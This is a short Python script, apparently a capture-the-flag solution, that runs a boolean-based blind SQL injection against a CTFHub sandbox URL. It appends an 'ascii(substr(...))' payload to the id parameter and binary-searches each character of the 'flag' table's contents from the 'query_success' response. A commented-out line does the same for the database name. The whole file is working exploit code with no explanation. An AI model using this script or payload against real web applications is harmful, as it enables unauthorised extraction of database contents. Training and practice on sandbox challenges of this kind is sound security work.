# coding=gb2312
import requests
import time
url = "http://challenge-51d05b3da6fe4fd2.sandbox.ctfhub.com:10800/?id=1"
flag = ""
i = 0
while True:
    low = 32
    high = 128
    i += 1
    mid = (low + high) // 2
    while low <= high:
        time.sleep(0.06)
        p_url = url + " and ascii(substr((select group_concat(flag) from flag),{0},1))>={1}#".format(i,mid)
        #p_url = url + "and ascii(substr((select database()),{0},1))>={1}#".format(i,mid)
        r = requests.get(p_url)
        if "query_success" in r.text:
            low = mid + 1
            mid = (low + high) // 2
            pass
        else:
            high = mid - 1
            mid = (low + high) // 2
            pass
        pass
    flag += chr(mid)
    if mid == 31:
        break
    print(flag)
